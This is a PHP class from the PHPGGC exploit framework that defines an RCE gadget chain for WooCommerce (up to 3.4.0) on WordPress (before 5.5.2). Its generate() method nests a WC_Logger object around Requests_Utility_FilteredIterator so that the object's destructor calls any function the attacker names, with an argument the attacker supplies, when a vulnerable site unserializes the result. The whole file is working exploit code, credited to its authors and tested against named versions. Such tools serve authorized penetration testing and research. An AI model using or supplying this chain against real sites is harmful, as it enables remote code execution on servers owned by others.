<?php

namespace GadgetChain\WordPress\P\WooCommerce;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '<= 3.4.0 & WP < 5.5.2';
    public static $vector = '__destruct';
    public static $author = 'Vincent Ulitzsch(@vinulium) and Pascal Zenker (@parzel2), based on WooCommerce RCE by erwan_lr';
    public static $information = '
        Simple adaption of the gadgetchain demonstrated at BSide Manchester: https://www.youtube.com/watch?v=GePBmsNJw6Y&t=1763.
        Original chain by erwan_lr.
        Tested up to WP 5.1.1 and WooCommerce 3.4.0 activated (but not configured).
    ';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \WC_Logger(new \Requests_Utility_FilteredIterator([$parameter], $function));
    }
}
